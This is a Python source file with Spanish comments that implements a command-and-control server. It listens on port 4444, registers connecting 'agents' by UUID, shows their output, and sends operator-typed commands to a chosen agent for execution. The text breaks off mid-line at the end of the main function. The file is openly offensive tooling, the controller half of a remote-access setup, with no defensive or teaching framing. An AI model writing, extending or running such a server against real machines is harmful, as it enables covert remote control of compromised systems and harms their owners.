import asyncio
import uuid

clients = {}  # Diccionario para almacenar agentes conectados {id: writer}

async def handle_client(reader, writer):
    """Maneja las conexiones de los agentes."""
    agent_id = str(uuid.uuid4())  # Generar un ID único
    clients[agent_id] = writer

    addr = writer.get_extra_info("peername")
    print(f"[+] Agente {agent_id} conectado desde {addr}")

    try:
        while True:
            data = await reader.read(1024)  # Espera respuesta del agente
            if not data:
                break
            print(f"[{agent_id}] -> {data.decode().strip()}")
    except:
        pass

    print(f"[-] Agente {agent_id} desconectado.")
    del clients[agent_id]
    writer.close()
    await writer.wait_closed()

async def send_command():
    """Envía comandos a los agentes conectados."""
    while True:
        if clients:
            print("\nAgentes conectados:")
            for agent_id in clients.keys():
                print(f" - {agent_id}")

            target_id = input("\nIngrese el ID del agente: ")
            command = input("Comando a ejecutar: ") + "\n"

            if target_id in clients:
                clients[target_id].write(command.encode())
                await clients[target_id].drain()
            else:
                print("[!] ID no válido.")
        else:
            print("[!] No hay agentes conectados.")
        await asyncio.sleep(1)

async def main():
    """Inicia el servidor y el manejador de comandos."""
    server = await asyncio.start_server(handle_client, "0.0.0.0", 4444)
    print("[*] Servidor C2 iniciado en 0.0.0.0:4444")

    await asyncio.gather(se
